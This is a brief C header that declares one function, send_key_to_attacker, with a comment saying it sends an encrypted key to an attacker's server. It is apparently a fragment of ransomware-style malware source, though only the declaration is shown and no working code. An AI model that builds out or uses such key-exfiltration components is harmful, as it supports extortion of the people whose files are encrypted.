#pragma once

#ifdef __cplusplus
extern "C" {
#endif

// send encrypted key to attacker's server
int send_key_to_attacker(const char *key_file);

#ifdef __cplusplus
}
#endif
